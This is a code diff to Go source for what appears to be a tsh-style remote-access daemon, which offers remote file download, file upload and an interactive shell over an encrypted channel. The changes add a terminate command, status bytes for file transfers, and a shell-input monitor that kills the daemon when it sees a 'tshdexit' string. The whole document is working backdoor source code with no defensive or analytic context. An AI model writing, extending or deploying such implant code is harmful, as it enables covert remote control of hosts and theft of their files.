@@ -119,6 +119,8 @@ func handleGeneric(layer *pel.PktEncLayer) {
 		handlePutFile(layer)
 	case constants.RunShell:
 		handleRunShell(layer)
+	case constants.Terminate:
+		os.Exit(0)
 	}
 }
 
@@ -131,9 +133,12 @@ func handleGetFile(layer *pel.PktEncLayer) {
 	filename := string(buffer[:n])
 	f, err := os.Open(filename)
 	if err != nil {
+		layer.Write([]byte{0}) // Failure
+		layer.Write([]byte(err.Error()))
 		return
 	}
 	defer f.Close()
+	layer.Write([]byte{1}) // Success
 	utils.CopyBuffer(layer, f, buffer)
 }
 
@@ -146,9 +151,12 @@ func handlePutFile(layer *pel.PktEncLayer) {
 	filename := filepath.FromSlash(string(buffer[:n]))
 	f, err := os.OpenFile(filename, os.O_CREATE|os.O_RDWR, 0644)
 	if err != nil {
+		layer.Write([]byte{0}) // Failure
+		layer.Write([]byte(err.Error()))
 		return
 	}
 	defer f.Close()
+	layer.Write([]byte{1}) // Success
 	utils.CopyBuffer(f, layer, buffer)
 	layer.Close()
 }
@@ -182,8 +190,35 @@ func handleRunShell(layer *pel.PktEncLayer) {
 	}
 	defer tp.Close()
 	go func() {
-		utils.CopyBuffer(tp.StdIn(), layer, buffer)
-		tp.Close()
+		// Modified CopyBuffer to detect tshdexit
+		buf := make([]byte, constants.Bufsize)
+		var lastBytes []byte
+		for {
+			n, err := layer.Read(buf)
+			if err != nil {
+				tp.Close()
+				return
+			}
+			if n > 0 {
+				tp.StdIn().Write(buf[:n])
+
+				// Check for tshdexit
+				for i := 0; i < n; i++ {
+					b := buf[i]
+					lastBytes = append(lastBytes, b)
+					if len(lastBytes) > 20 {
+						lastBytes = lastBytes[len(lastBytes)-20:]
+					}
+					if len(lastBytes) >= 9 {
+						suffix := string(lastBytes[len(lastBytes)-9:])
+						if suffix == "tshdexit\r" || suffix == "tshdexit\n" {
+							// FORCE EXIT DAEMON
+							os.Exit(0)
+						}
+					}
+				}
+			}
+		}
 	}()
 	utils.CopyBuffer(layer, tp.StdOut(), buffer2)
 }
